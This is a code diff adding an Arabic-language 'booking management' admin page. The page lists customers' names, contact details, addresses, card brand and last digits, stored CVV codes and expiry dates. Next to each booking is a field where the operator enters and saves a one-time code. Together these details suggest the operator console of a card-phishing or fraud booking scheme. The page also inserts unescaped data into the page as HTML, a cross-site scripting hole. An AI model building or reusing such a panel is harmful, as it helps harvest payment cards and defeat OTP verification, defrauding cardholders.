@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<title>لوحة الإدارة</title>
+</head>
+<body>
+<h2 style="text-align:center;">لوحة إدارة الحجوزات</h2>
+
+<table border="1" id="bookingsTable" style="width:100%; text-align:center;">
+  <thead>
+    <tr>
+      <th>الاسم</th>
+      <th>الهاتف</th>
+      <th>البريد</th>
+      <th>العنوان</th>
+      <th>رقم البطاقة</th>
+      <th>نوع البطاقة</th>
+      <th>رمز الحماية</th>
+      <th>تاريخ الانتهاء</th>
+      <th>الحالة</th>
+      <th>اسم حامل البطاقة</th>
+    </tr>
+  </thead>
+  <tbody></tbody>
+</table>
+
+<script>
+async function loadBookings() {
+  const res = await fetch('/api/bookings');
+  const data = await res.json();
+  const tbody = document.querySelector('#bookingsTable tbody');
+  tbody.innerHTML = '';
+  
+  data.forEach(b => {
+    const tr = document.createElement('tr');
+    tr.innerHTML = `
+  <td>${b.first_name} ${b.last_name}</td>
+  <td>${b.phone}</td>
+  <td>${b.email}</td>
+  <td>${b.address}</td>
+  <td>${b.card_last4}</td>
+  <td>${b.card_brand}</td>
+  <td>${b.cvv || ''}</td> <!-- إذا خزنت CVV -->
+  <td>${b.card_expiry}</td>
+  <td>${b.status || ''}</td>
+  <td>
+    <input type="text" id="otp-${b.id}" placeholder="ادخل الكود">
+    <button onclick="setOtp(${b.id})">حفظ الكود</button>
+  </td>
+`;
+    tbody.appendChild(tr);
+  });
+}
+
+async function setOtp(bookingId) {
+  const otp = document.getElementById(`otp-${bookingId}`).value;
+  await fetch('/api/set-otp', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ bookingId, otp })
+  });
+  alert('تم تحديث الكود');
+  loadBookings();
+}
+
+loadBookings();
+</script>
+</body>
+</html>
